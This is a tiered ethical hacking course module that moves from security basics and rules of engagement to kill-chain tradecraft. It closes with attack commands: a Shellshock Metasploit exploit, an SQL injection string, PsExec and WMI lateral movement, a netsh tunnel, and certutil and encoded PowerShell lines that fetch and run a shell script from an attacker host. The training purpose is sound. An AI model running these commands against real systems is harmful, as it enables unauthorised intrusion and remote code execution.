2. Beginner Level — Core Foundations

Foundational concepts for practitioners new to ethical hacking. Assume zero prior knowledge of penetration testing, adversary methodology, or security frameworks.

Module Overview & Purpose

Ethical hacking (also known as penetration testing or red teaming) is the authorised practice of probing systems, applications, and people to identify weaknesses before adversaries do. This module teaches the mindset, methodology, and legal/ethical guardrails needed to perform high-quality security assessments that are safe, repeatable, and defensible.

Learning Objectives

  • Describe the core elements of information security — Confidentiality, Integrity, Availability (CIA triad), plus Authentication, Authorization and Accounting (AAA).
  • Explain common information security attacks, the attackers motivations, and the concept of information warfare.
  • Differentiate hacker classes and threat actors — Script Kiddies, Opportunistic Criminals, Organised Crime, Insider Threats, Nation-State Actors, and Hacktivists.
  • Define ethical hacking principles and demonstrate how AI/ML augment modern assessment workflows.
  • Walk through common hacking methodologies and frameworks — reconnaissance → discovery → exploitation → persistence → post-exploitation → cleanup/reporting.
  • Apply information security controls and defensive concepts — Defense-in-depth, Least Privilege, Secure Defaults, Threat Modelling and incident response.
  • Summarise relevant laws, Policy Considerations, and the Rules of Engagement that govern authorised testing.

Analogy / Context

Think of ethical hacking as hiring a professional security consultant to test the locks on your building. They use the same tools and techniques as a burglar, but they do it with your permission, during agreed hours, and they give you a detailed report of which locks are weak and how to fix them. They don’t steal your valuables, they prove they could have, and they tell you how to prevent it.

Core Concepts / Quick Reference

  • CIA Triad: Confidentiality, Integrity, Availability; the foundational goals of security design and assessment.
  • Attack Surface: All exposed ways an adversary can reach an asset; network, web apps, APIs, cloud interfaces, humans, and supply chains.
  • Threat Actor Classification: Motivation, Capability, Intent; use this to prioritise findings and contextualise risk.
  • Controls: Preventive (firewalls, hardening), detective (logs, IDS/EDR), and corrective (patching, backups).

Hacker Classes & Motivations

  • Script Kiddies: Low skill, use public tools for notoriety or mischief.
  • Cybercriminals: Financially motivated — ransomware, fraud, credential harvesting.
  • Insiders: People with legitimate access who misuse it (malicious or negligent).
  • Nation-State / Advanced Persistent Threat (APT): Highly resourced, focused on long-term access and stealth.
  • Hacktivists: Politically motivated — may leak or deface.

Legal, Policy & OPSEC Considerations

  • Always operate under a signed Rules of Engagement (RoE) and an explicit scope that defines targets, permitted techniques, data handling, and escalation. Never deviate without written consent.
  • Understand local and international laws (computer misuse, privacy, data protection) before testing. Treatment of leaked data, credential handling, and interactions with third parties require legal counsel or client approval.
  • Maintain strict OPSEC — separate testing infrastructure, restricted logs, minimize collateral discovery, and sanitize any sensitive artifacts before inclusion in reports or demos.

3. Intermediate Level — Practitioner Application

This section outlines the practical workflow used in professional engagements, bridging the gap between theoretical frameworks such as NIST or MITRE ATT&CK and real-world execution.

Methodologies & Frameworks (Practical)

Phase 1: Reconnaissance (Passive → Active)

Concept:

  • Gather information without direct system interaction.
  • Send small probes to map the external surface.

Adversary Mindset:

  • Collect target data before knocking on the door.
  • Identify target identity metrics.
  • Determine underlying technology infrastructure.
  • Track physical employee footprints.

Examples: Tools, Commands, and Outputs

OSINT Gathering:

  • Tool: theHarvester or Maltego
  • Command: 
    python3 theHarvester.py -d target.com -b all
  • Output: Public emails, subdomains, and employee names.

Search Engine Discovery:

  • Tool: Shodan CLI
  • Command: 
    shodan search "http.title:'Dashboard' org:TargetCorp"
  • Output: IP addresses of exposed internal dashboards.

Subdomain Mapping:

  • Tool: Amass or subfinder
  • Command: 
    amass enum -d target.com
  • Output: Exposed active infrastructure trails like dev.target.com.

Phase 2: Discovery & Enumeration

Concept:

  • Scan identified hosts actively.
  • Locate open system ports.
  • Identify running network services.
  • Uncover potential entry points.

Adversary Mindset:

  • Investigate what sits behind discovered doors.
  • Verify active locking mechanism signatures.
  • Check for known architectural bypasses.

Examples: Tools, Commands, and Outputs

Port Scanning:

  • Tool: Nmap
  • Command: 
    nmap -sV -sC -p- 192.168.1.50
  • Output: Open SSH, HTTP, and MySQL ports with service versions.

Web Crawling:

  • Tool: Gobuster or Dirb
  • Command: 
    gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt
  • Output: Hidden directories including /admin, /backup, and /api/v1.

API Mapping:

  • Tool: Postman or Swagger UI
  • Request: 
    GET /api/users/export
  • Output: Discovery of undocumented or weakly protected endpoints.

Phase 3: Exploitation (Safe Proof-of-Concept)

Concept:

  • Validate vulnerabilities in a controlled manner.
  • Prioritize safe evidence collection over destruction.

Adversary Mindset:

  • Turn the key gently to see if the door opens.
  • Confirm access without triggering defensive alerts.

Examples: Tools, Commands, and Outputs

Vulnerability Scanning:

  • Tool: OpenVAS or Nessus
  • Command: 
    nessuscli scan start --uuid <scan_uuid>
  • Output: Detailed report highlighting identified CVEs and risk scores.

Manual Exploitation:

  • Tool: Metasploit Framework
  • Command: 
    use exploit/multi/http/apache_mod_cgi_bash_env_exec
exploit -j
  • Output: A new controlled test session confirming exploitability.

Phase 4: Post-Exploitation & Lateral Movement

Concept:

  • Analyze privilege boundary scopes once inside.
  • Map out active internal movement paths.
  • Assess total potential business impact safely.

Adversary Mindset:

  • Evaluate structural reachability from the current foothold.
  • Locate database vaults and administrative panels.

Examples: Tools, Commands, and Outputs

Privilege Escalation:

  • Tool: LinPEAS.sh or WinPEAS.exe
  • Command: 
    ./linpeas.sh | grep -i "sudo"
  • Output: Discovery of escalation paths including risky sudo permissions.

Lateral Movement:

  • Tool: PsExec or SSH
  • Command: 
    psexec.exe \\192.168.1.51 cmd.exe
  • Output: Regulated command execution on an adjacent target host.

Phase 5: Reporting & Remediation

Concept:

  • Translate technical findings into business risk metrics.
  • Provide clear evidence trail timelines.
  • Document accurate reproduction step procedures.
  • Deliver actionable, prioritized remediation guidance.

Ethical Hacker Mindset:

  • Prove the threat vector clearly to stakeholders.
  • Enable the defensive team to patch systems quickly and safely.

Examples: Tools, Commands, and Outputs

Evidence Collection & Analysis:

  • Artifacts: Screenshots, terminal log buffers, and exact execution timestamps.
  • Sample Finding: SQL Injection discovered within the primary authentication web form.
  • Exploit Trigger Vector: 
    Input: ' OR 1=1 --
Result: Access granted
  • Remediation Control Fix: Implement parameterized input queries and prepared statements globally.

Defensive Verification Testing:

  • Validation Tool: cURL Terminal Command
  • Retesting Action: 
    curl -v http://target.com/login -d "user=admin'--&pass=x"
  • Expected Fixed System Output: 
    401 Unauthorized

Defining the End Game: Red Team & Blue Team Perspectives

Every engagement should begin with a clearly defined objective. Success is measured by achieving that objective while maintaining operational discipline and minimizing detection.

Red Team Objectives

  • Obtain privileged access
  • Access sensitive information
  • Validate attack paths
  • Demonstrate business impact

Blue Team Objectives

  • Detect initial access attempts
  • Identify lateral movement activity
  • Contain the intrusion
  • Reduce attacker dwell time

Offensive and defensive teams are interconnected. Red Team findings should directly improve Blue Team detection, response, and remediation capabilities.

Feedback Loop: Exploitation to Remediation

Every successful attack path should generate actionable defensive improvements. Security assessments are most valuable when they provide clear remediation guidance and measurable security outcomes.

Operational Security (OPSEC) as a Metric

The effectiveness of an assessment is not measured solely by whether a target was compromised. Professional operators also evaluate how quietly objectives were achieved and whether defensive controls detected their activity.

Discover → Analyze → Exploit → Achieve Objective → Report → Improve. This continuous cycle forms the foundation of modern ethical hacking and adversary simulation operations.

Key Principle: Enumeration without a hypothesis is just noise. Every command must validate an assumption or advance a defined objective. Treat each output as intelligence, not just confirmation.

4. Advanced Level — Adversary Mindset & Operational Tradecraft

Deep technical detail for operators conducting authorized assessments. This level covers adversary emulation, precision methodology, AI/ML integration, and kill chain mechanics.

Operational Considerations

  • OPSEC note 1: Every action must support a clearly defined objective. Unnecessary noise increases detection probability and degrades assessment value. Maintain a decision log for every major tool execution.
  • OPSEC note 2: Isolate all testing infrastructure from personal and production assets. Use dedicated VMs, VPN exit nodes, and single-use accounts to prevent attribution, cross-contamination, and accidental scope creep.
  • OPSEC note 3: Validate all AI-generated payloads, CVE references, and exploit commands manually before execution. Hallucinated findings or incorrect version matches can invalidate an entire engagement and expose the operator to liability.
  • OPSEC note 4: Map every technique to a MITRE ATT&CK identifier and timestamp all outputs. This audit trail protects the operator legally and provides the client with detection engineering data.

Inside the Adversary Mindset: Precision Methodology

Ethical hacking is more than running tools against a target. Professional operators think like adversaries. Every action should support a clearly defined objective, reduce unnecessary noise, and contribute toward an identified end goal. This approach transforms testing from a checklist exercise into a strategic operation.

A. Cyber Kill Chain & MITRE ATT&CK Integration

Framework Reference: MITRE ATT&CK Framework ← click to open

Every activity performed during an engagement should align with a defined phase of the Cyber Kill Chain and map to known MITRE ATT&CK techniques. This provides structure, consistency, and traceability throughout the assessment.

  • Reconnaissance and OSINT collection
  • Target profiling and attack surface discovery
  • Vulnerability validation and exploitation
  • Persistence and privilege escalation
  • Post-exploitation activities and reporting

Rather than scanning every system indiscriminately, ethical hackers should use intelligence gathered during reconnaissance to focus on likely attack paths and high-value targets.

B. Modular Attack Path Mapping

Complex environments should be broken into manageable layers. Each layer presents different opportunities and challenges.

  1. External Surface: Web applications, APIs, DNS records, cloud services.
  2. Perimeter: Firewalls, IDS/IPS platforms, WAF technologies.
  3. Internal Network: Active Directory, lateral movement opportunities, trust relationships.
  4. Data Layer: Databases, file shares, cloud storage, and secrets management systems.

The objective is to identify the shortest and safest route to a defined goal rather than testing every possible pathway.

C. Hypothesis-Driven Enumeration

Enumeration should be driven by evidence and assumptions that can be validated. Instead of collecting data blindly, formulate hypotheses and test them through targeted reconnaissance.

  • "The organization hosts public cloud storage."
  • "The application uses a SQL-based backend."
  • "Active Directory is present internally."

Each hypothesis should guide the selection of tools and techniques, reducing noise while improving efficiency.

D. Adversary Emulation & TTPs

Advanced assessments often emulate real-world adversaries by adopting their Tactics, Techniques, and Procedures (TTPs). This helps organizations understand how actual threat actors would approach their environment.

  • Persistence mechanisms
  • Credential access techniques
  • Lateral movement strategies
  • Evasion and stealth methods
  • Data collection and exfiltration techniques

Adversary emulation provides more realistic findings and improves both defensive readiness and detection capabilities.

AI & Machine Learning in Ethical Hacking

This section focuses on practical applications where AI and machine learning tools augment human capability. You'll see how AI can support both offensive ethical hacking workflows and defensive security operations.

The Role of AI & ML in Modern Operations

  • Act as a force multiplier for ethical hackers by automating tedious tasks.
  • Identify hidden patterns within massive datasets.
  • Generate technical hypotheses for deeper target investigation.
  • Maintain human-in-the-loop validation to combat false positives and hallucinated findings.

Concept:

  • Process massive volumes of unstructured public data.
  • Scan emails, social media streams, news alerts, and job listings automatically.

Key Considerations: Bias & Hallucination

Aspect Description Ethical Hacker's Role
Hallucination AI may invent facts, tools, CVEs, affected versions, or vulnerabilities that don’t exist. Verify manually. Reproduce the finding before reporting it.
Bias AI may prioritize certain vulnerability types based on training data rather than your environment's actual risk. Contextualize risk using business impact, asset value, exposure, and exploitability.
Over-Automation Relying on AI for final decisions can miss nuance and create operational mistakes. Keep humans in the loop. Use AI for suggestions, not final authority.

5. Adversarial Level

Threat actor perspective. Advanced persistent threats, criminal groups, and red teams operate with a deep understanding of both defensive controls and human behavior.

Threat Actor Behavior

Operational Planning

  • Conduct extensive reconnaissance before any active engagement — months or years for nation-state actors.
  • Weaponize public information (OSINT) to craft personalized phishing lures and social engineering campaigns.
  • Emulate legitimate user behavior to avoid triggering behavioral analytics and UEBA alerts.

Defensive Evasion

  • Use "Living off the Land" (LOLBin) tools to blend with normal administrative activity.
  • Deploy fileless malware and memory-only execution to bypass traditional antivirus and EDR signatures.
  • Study public MITRE ATT&CK mappings to understand which techniques defenders have detection rules for.

Adversary Decision Cycle: The OODA Loop in Practice

Advanced persistent threats do not execute tools randomly. They follow a decision cycle that mirrors the OODA loop (Observe, Orient, Decide, Act). During reconnaissance, they observe target behavior, patch cadence, and defensive tooling from open sources. They orient by mapping the target's technology stack to known vulnerability databases and exploit frameworks. They decide on the cheapest, quietest path to the objective. They act with precision — often using native administrative tools already present on the target system to minimize forensic artifacts and avoid signature-based detection.

Tool Selection Logic: Speed vs. Stealth

Adversaries constantly weigh speed against stealth. Financially motivated ransomware groups may prioritize speed, accepting noisy scans and off-the-shelf exploits to maximize return on investment before incident responders contain the breach. Nation-state actors and advanced espionage groups prioritize stealth above all, sometimes remaining dormant for months, using only legitimate credentials and built-in operating system utilities. Red teams must emulate both profiles depending on the assessment's stated objectives.

  • High-Speed, Low-Stealth: Masscan, Nmap -T5, automated Metasploit modules, password spraying tools like Spraycharles or o365spray.
  • Low-Speed, High-Stealth: Manual API endpoint enumeration, use of compromised but legitimate accounts, LOLBins (certutil, wmic, powershell), DNS tunneling (iodine, dnscat2), and memory-resident payloads.
  • Hybrid Approach: Targeted scanning during maintenance windows, multi-stage droppers that sleep for days, and "Golden Ticket" or "Silver Ticket" attacks that blend with normal Kerberos traffic.

Real-World Context: From Initial Access to Domain Dominance

A typical enterprise breach mirrors the Cyber Kill Chain precisely. The operator begins with OSINT to identify soft targets — a public-facing VPN concentrator with no MFA, a cloud storage bucket with misconfigured permissions, or a webmail portal running an outdated version. They harvest credentials via spear-phishing or password spraying. Once inside, they escalate privileges using local exploits, unpatched services, or token theft. Lateral movement is achieved through native tools (PSExec, WMI, PowerShell remoting, RDP hijacking) to avoid dropping custom binaries. Domain dominance is achieved via DCSync, Golden Ticket, or KRBTGT reset attacks. Every step is logged by the operator but designed to appear as legitimate administrative activity in SIEM dashboards.

"Ethical hacking is not about breaking systems for the sake of access. It is a structured, authorized, and professional process used to identify weaknesses, understand risk, and improve an organization's ability to prevent, detect, and respond to cyber threats."

6. Adversarial Examples — Commands and Tools

Concrete command lines, tool syntax, and proof-of-concept techniques used across the kill chain. Keep it copy-paste friendly for authorized lab environments. 

# Phase 1: Passive OSINT subdomain enumeration
$ amass enum -d target.com

# Phase 1: Shodan search for exposed dashboards
$ shodan search "http.title:'Dashboard' org:TargetCorp"

# Phase 2: Full TCP port scan with service/version detection
$ nmap -sV -sC -p- 192.168.1.50

# Phase 2: Web directory brute-forcing
$ gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt

# Phase 3: Safe exploitation via Metasploit
$ msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS 192.168.1.50; exploit -j"

# Phase 4: Linux privilege escalation enumeration
$ ./linpeas.sh | grep -i "sudo"

# Phase 4: Windows lateral movement via PsExec
$ psexec.exe \\192.168.1.51 cmd.exe

# Phase 5: Retest SQLi fix with cURL
$ curl -v http://target.com/login -d "user=admin'--&pass=x"

Adversary Rationale by Phase

The commands listed above are not arbitrary selections. Each reflects a specific adversary cost-benefit calculation. In Phase 1, the adversary optimizes for zero direct contact — any active probe risks detection and attribution. In Phase 2, the adversary accepts controlled interaction but seeks to minimize noise, often throttling scan speed or fragmenting packets. Phase 3 represents the commit point: the adversary has validated a vulnerability and shifts from reconnaissance to exploitation. Phase 4 is the breakout — the moment the adversary leverages the initial foothold to map trust relationships and identify high-value targets. Phase 5 is where the ethical operator diverges from the criminal: instead of exfiltrating data or deploying ransomware, they document, report, and help the defensive team close the aperture.

Living Off the Land: Adversary OPSEC

Sophisticated adversaries avoid installing custom malware when possible. They prefer "Living Off The Land" (LOTL) techniques that abuse signed, native binaries already present on the target. This approach defeats signature-based detection and forces defenders to rely on behavioral analytics and anomaly detection — which are harder to tune and more prone to false positives. 

# Phase 3 (LOTL): Using certutil (signed Windows binary) to download a payload
$ certutil -urlcache -split -f http://192.168.1.100/shell.ps1 %TEMP%\update.ps1

# Phase 3 (LOTL): Using PowerShell to execute a memory-only payload (no disk artifact)
$ powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=

# Phase 4 (LOTL): Using WMI for lateral movement without dropping binaries on remote disk
$ wmic /node:192.168.1.51 process call create "cmd.exe /c whoami > \\192.168.1.50\share\out.txt"

# Phase 4 (LOTL): Using netsh to create a persistent port proxy / tunnel
$ netsh interface portproxy add v4tov4 listenport=4444 connectaddress=192.168.1.100 connectport=443
Operator Note: When emulating LOTL techniques in authorized assessments, always alert the Blue Team beforehand if the engagement is purple-team oriented. LOTL activity is specifically designed to evade traditional signatures, and unexpected use of these commands can trigger lengthy incident response investigations.
